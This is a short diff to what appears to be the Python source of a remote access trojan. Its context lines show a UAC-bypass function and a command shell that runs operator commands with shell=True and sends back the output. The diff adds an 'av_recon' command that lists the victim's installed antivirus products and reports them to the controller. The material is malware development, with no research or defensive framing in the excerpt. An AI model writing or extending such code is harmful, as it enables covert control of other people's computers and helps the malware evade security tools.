@@ -31,6 +31,13 @@ import psutil
 import urllib.request as urllib2
 import platform
 import struct
+import windows_tools.antivirus
+def getav():
+    result = windows_tools.antivirus.get_installed_antivirus_software()
+
+    l = str(result).replace(',', '\n').replace("'", "").replace("}", '\n').replace('{', "").replace('[', "").replace(
+        ']', '')
+    return l
 def bypassuac():
 
     HKCU = HKEY_CURRENT_USER
@@ -1017,6 +1024,8 @@ def shell():
                         reliable_send('[-] Tryagain using this Syntax Maybe findfiles|Extention|Directory')
                     else:
                         reliable_send("[*] Fetching Files from "+ split[2] + " Directory" + "\n" + filetofind(split[1],split[2]))
+                elif command[:8] == 'av_recon':
+                    reliable_send("[+] AV info \n"+getav())
                 else:
 
                     execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
